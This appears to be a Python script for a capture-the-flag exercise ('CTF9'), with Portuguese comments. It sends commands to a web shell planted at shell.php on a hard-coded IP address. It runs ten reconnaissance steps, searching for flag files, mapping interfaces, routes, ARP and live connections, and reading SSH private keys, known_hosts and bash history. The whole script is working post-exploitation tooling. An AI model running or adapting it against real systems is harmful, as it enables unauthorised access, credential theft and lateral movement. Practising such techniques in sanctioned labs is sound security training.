#!/usr/bin/env python3
"""
Script de Investigação Automática - Parte 1 CTF9
Busca Flag 4 e informações de rede interna
"""

import requests
import urllib.parse
import sys

TARGET = "44.197.173.254"
WEBSHELL = f"http://{TARGET}/shell.php"

def execute_command(cmd):
    """Executa comando via webshell"""
    try:
        encoded_cmd = urllib.parse.quote(cmd)
        url = f"{WEBSHELL}?cmd={encoded_cmd}"
        response = requests.get(url, timeout=10)
        return response.text.strip()
    except Exception as e:
        return f"ERRO: {e}"

def main():
    print("=" * 60)
    print("INVESTIGAÇÃO AUTOMÁTICA - PARTE 1 CTF9")
    print(f"Alvo: {TARGET}")
    print("=" * 60)
    print()
    
    # Teste inicial
    print("[1/10] Testando webshell...")
    result = execute_command("whoami")
    print(f"Resultado: {result}")
    if "www-data" not in result.lower():
        print("⚠️ Webshell pode não estar funcionando!")
    print()
    
    # Busca por flags
    print("[2/10] Buscando arquivos com 'flag' no nome...")
    result = execute_command("find / -name '*flag*' -type f 2>/dev/null")
    print(result)
    print()
    
    # Busca por LightBringers
    print("[3/10] Buscando arquivos LightBringers...")
    result = execute_command("find / -name '*LightBringers*' -o -name '*lightbringers*' 2>/dev/null")
    print(result)
    print()
    
    # Rede interna
    print("[4/10] Verificando interfaces de rede...")
    result = execute_command("ip a")
    print(result)
    print()
    
    print("[5/10] Verificando rotas...")
    result = execute_command("ip route")
    print(result)
    print()
    
    print("[6/10] Verificando ARP cache...")
    result = execute_command("arp -a")
    print(result)
    print()
    
    # Conexões
    print("[7/10] Verificando conexões estabelecidas...")
    result = execute_command("ss -antp | grep ESTABLISHED")
    print(result)
    print()
    
    # Chaves SSH
    print("[8/10] Buscando chaves SSH...")
    result = execute_command("find / -name 'id_rsa*' 2>/dev/null")
    print(result)
    print()
    
    # Known hosts
    print("[9/10] Verificando known_hosts...")
    result = execute_command("cat ~/.ssh/known_hosts 2>/dev/null")
    print(result)
    print()
    
    # Histórico
    print("[10/10] Verificando histórico de comandos...")
    result = execute_command("cat ~/.bash_history 2>/dev/null")
    print(result)
    print()
    
    print("=" * 60)
    print("INVESTIGAÇÃO CONCLUÍDA")
    print("=" * 60)

if __name__ == "__main__":
    main()
